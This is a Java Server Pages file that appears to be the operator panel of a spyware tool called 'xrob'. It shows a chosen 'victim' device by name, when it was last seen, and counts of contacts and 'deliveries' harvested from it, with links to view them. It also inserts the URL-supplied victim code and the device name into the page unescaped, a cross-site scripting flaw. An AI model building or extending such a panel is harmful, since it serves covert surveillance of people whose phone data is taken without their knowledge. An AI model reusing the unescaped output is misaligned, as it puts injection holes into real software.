<%@ page import="com.theah64.xrob.api.models.Victim" %>
<%@ page import="java.util.List" %>
<%@ page import="com.theah64.xrob.api.database.tables.Victims" %>
<%@ page import="com.theah64.xrob.api.utils.CommonUtils" %>
<%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
<%@ page import="com.theah64.xrob.api.database.tables.Deliveries" %>
<%@ page import="com.theah64.xrob.api.database.tables.Contacts" %>
<%--
  Created by IntelliJ IDEA.
  User: theapache64
  Date: 12/9/16
  Time: 4:08 PM
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@include file="../signin_check.jsp" %>

<html>
<head>
    <%

    %>
    <title>Victims</title>
    <%@include file="../../common_headers.jsp" %>


</head>
<body>
<div class="container">
    <%@include file="../header.jsp" %>

    <div class="row">
        <%
            try {

                final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 1, 1);
                final String victimCode = pathInfoUtils.getPart(1);
                final Victims victimsTable = Victims.getInstance();
                final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);

                if (theVictim != null) {

                    final String lastDelivery = Deliveries.getInstance().getLastDeliveryTime(theVictim.getId());

        %>


        <div class="row">
            <div class="col-md-12">
                <h4><%=theVictim.getDeviceName()%>
                    <small>
                        <%=lastDelivery == null ? "(Not yet seen)" : "(last seen: " + lastDelivery + ")" %>
                    </small>
                </h4>

            </div>
        </div>

        <div class="row" style="margin-top: 20px;">

            <div class="col-lg-3">
                <a href="/client/victim/contacts/<%=victimCode%>">
                    <div class="profile_grid">
                        <p class="profile_grid_main_title"><%=Contacts.getInstance().getTotal(theVictim.getId())%>
                        </p>

                        <p class="profile_grid_sub_title">Contacts</p>
                    </div>
                </a>
            </div>

            <div class="col-lg-3">
                <a href="/client/victim/deliveries/<%=victimCode%>">
                    <div class="profile_grid">
                        <p class="profile_grid_main_title"><%=Deliveries.getInstance().getTotal(theVictim.getId())%>
                        </p>

                        <p class="profile_grid_sub_title">Deliveries</p>
                    </div>
                </a>
            </div>

        </div>

        <%

            } else {
                throw new PathInfo.PathInfoException("Invalid victim code");
            }

        %>
    </div>

    <div class="row">

        <%
        } catch (PathInfo.PathInfoException e) {
            e.printStackTrace();
        %>
        <h1 class="text-danger text-center">Invalid profile</h1>
        <%
            }
        %>
    </div>

</div>
</body>
</html>
